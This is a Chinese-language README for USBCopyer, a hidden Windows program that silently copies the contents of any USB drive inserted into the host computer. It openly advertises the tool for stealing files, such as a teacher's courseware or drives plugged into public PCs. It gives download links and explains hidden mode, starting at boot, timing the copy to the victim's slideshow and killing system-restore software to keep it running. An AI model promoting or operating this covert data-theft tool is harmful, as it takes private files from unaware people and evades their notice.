# USBCopyer: 插上U盘自动复制U盘文件
[![Build status](https://ci.appveyor.com/api/projects/status/xv5b8wf0h7cuy897?svg=true)](https://ci.appveyor.com/project/kenvix/usbcopyer)   

**用于在插上目标U盘后自动复制该U盘的文件。"偷U盘文件的神器"**，支持设置冲突解决方案，支持延迟复制，支持扩展名黑白名单，支持磁盘分区号/序列号黑名单，支持日志，支持弹出U盘时强制停止复制防止占用              
本程序有两个图标，默认图标表示当前处于空闲状态，红色图标表示当前正在复制文件（工作中）              
![Screenshot](https://git.oschina.net/kenvix/USBCopyer/raw/master/git-resources/screenshot.jpg)

## 已编译版本下载

.Net Framework 3.5       
[点击从Git@OSC下载](https://git.oschina.net/kenvix/USBCopyer/raw/master/USBCopyer/bin/Release/USBCopyer.exe)         [点击从GitHub下载](https://github.com/kenvix/USBCopyer/blob/master/USBCopyer/bin/Release/USBCopyer.exe?raw=true)           
需要安装.Net Framework 3.5，[没有安装请点此](https://download.microsoft.com/download/7/0/3/703455ee-a747-4cc8-bd3e-98a615c3aedb/dotNetFx35setup.exe)

### 适用场景

1.获取授课教师的课件         
2.获取插到某台公用电脑上的U盘的数据
3.（并非本程序的设计用途）备份U盘         

#### 如何使用

1.下载
2.双击 USBCopyer.exe
3.程序将在托盘区运行，右击图标可以调整其参数
  点击 "隐藏图标" 将彻底隐藏程序，只能使用任务管理器停止，或按Win+R输入taskkill /f /im USBCopyer.exe
  点击 "设置" 可以设置程序

#### 命令行
USBCopyer.exe [/hide]           
   /hide     以隐藏模式启动，只能通过任务管理器结束进程

### 常见问题
##### USBCopyer的复制行为造成U盘的文件操作卡顿
请设置一个延迟。通常推荐在使用者开始放映幻灯片时开始复制

##### 使用者在使用该电脑前重启了此电脑
将本程序设为开机启动即可。设置方法如下：
1. 直接在本程序的“设置”中设置
2. 若上面的方法无效，则可：   
   创建一个快捷方式，然后加上参数，拖到 "开始菜单" 的 "启动" 文件夹即可

##### 可否复制手机的文件？
若为MTP/PTP则无法实现，但如果是以Mass Storage(大容量存储)模式挂载到电脑上的设备则可以复制

##### U盘在操作完成前被拔出
无解

##### 目标电脑带有还原机制
两种方法：       
1.插上你的U盘，然后启动本程序，加入该U盘到黑名单，然后设置输出目录到你的U盘         
2.用 PCHunter 之类的程序干掉还原程序

## 代码仓库
[Git@OSC](https://git.oschina.net/kenvix/USBCopyer) [GitHub](https://github.com/kenvix/USBCopyer)            
[我的博客文章](https://kenvix.com/?p=86)

## 捐赠
USBCopyer 是一个开源的，非盈利的项目。如果你喜欢这个项目，请捐赠它：
##### 支付宝捐赠
1278730467@qq.com      
![Screenshot](https://git.oschina.net/kenvix/USBCopyer/raw/master/git-resources/alipay-pay.jpg)
##### 微信支付捐赠
![Screenshot](https://git.oschina.net/kenvix/USBCopyer/raw/master/git-resources/weixin-pay.jpg)